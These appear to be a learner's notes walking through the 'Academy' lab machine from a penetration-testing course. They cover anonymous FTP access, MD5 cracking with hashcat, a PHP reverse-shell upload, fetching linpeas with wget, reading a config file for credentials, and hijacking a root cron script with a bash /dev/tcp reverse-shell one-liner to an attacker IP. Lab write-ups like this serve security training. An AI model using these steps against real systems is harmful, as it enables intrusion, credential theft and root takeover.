 Walkthrough Username:root  
passwd:tcm  
  
![](academy/walkthrough/Attachments/image.png)  
  
apache server probably means php in backend  
  
  
  
![](image 2.png)  
  
anonymous login to ftp:  
username:anonymous(random try)  
passwd:anonymous  
  
login was successful  
  
![](image 3.png)  
nmap revealed that there was a file note.txt  
![](image 24.png)  
  
![](image 4.png)  
  
copy the password hash  
#hash-identifier  
tool built in kali linux  
paste the hash  
  
  
![](image 5.png)  
  
  
possible md5 hash  
  
tool for passwd cracking:hashcat  
\*hascracking uses GPU not CPU so try to run on main OS and not VM  
  
#hashcat –m 0 hashes.txt /usr/share/wordlists/rockyou.txt  
![](image 6.png)  
  
  
![](image 7.png)  
  
password is student,we also have the username and userID from note.txt we got from ftp  
  
#dirb http://192.168.57.8  
for directory busting:no need for worlists  
  
another tool:ffuf for directory busting  
  
![](image 8.png)  
\-w:wordlists  
\-u:url  
replace Fuzz in url with wordlists words  
  
  
![](image 9.png)  
  
go to http://192.168.57.8/academy  
put the credentials  
  
right click on img->open image in new tab:to see where image is stored  
![](image 10.png)  
  
instead of img,try to upload a malware,if typeof file check is not done  
  
google php reverse shell:go to pentestmonkey  
copy .php file raw and paste it in file->paste in shell.php  
change ip in the php file to attacker machine ip  
  
#nc -nlvp 1234  
port should be same as that in shell.php  
  
now upload the shell file i.e shell.php  
and we get a reverse shell  
  
![](image 11.png)  
  
we are not root  
  
![](image 12.png)  
  
so we need to perform privilage escalation  
  
tool for privilage escalation on linux:linpeas(github:https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)  
  
#cd transfer(folder containing linpeas.sh)  
#python3 -m http.server 80  
host that folder on a server so that we can download it on victim using wget  
  
in academy reverse shell we got  
#cd tmp  
#pwd  
#wget http://<serverIP>/linpeas.sh  
  
  
Wget is the non-interactive network downloader which is used to download files from the server even  
when the user has not logged on to the system and it can work in the background without hindering the current process.   
  
![](image 13.png)  
  
  
  
![](image 14.png)  
  
/var/www/html/academy/includes/config.php  
#cat /var/www/html/academy/includes/config.php  
  
![](image 15.png)  
  
  
![](image 16.png)  
![](image 17.png)  
  
/etc/passwd:shows grimmie is administator  
  
#ssh grimmie@192.168.57.8  
  
![](image 18.png)  
  
now we are in the machine as grimmie:  
  
![](image 19.png)  
looks like backup.sh runs periodically  
  
tool:pspy  
![](image 20.png)  
  
#chmod +x pspy  
this shows all process running on the machine and we can see them even without sudo privilages  
  
try to find backup.sh because it looked like backup.sh was running periodically  
  
  
![](image 21.png)  
  
backup.sh running every minute  
  
google:bash reverse shell one liner:https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet  
  
#bash -i >& /dev/tcp/<attackerIP>/8080 0>&1  
  
we have a shell script:backup.sh  
we put this one liner in the shell script and it will perform reverse shell  
  
in grimmie:  
#nano backup.sh  
delete existing code and replace with reverse shell one liner  
  
  
in kali:  
#nc -nvlp 8080  
wait for some time coz script runs every minute  
  
and we get a reverse shell as root this time  
![](image 22.png)  
  
  
![](image 23.png)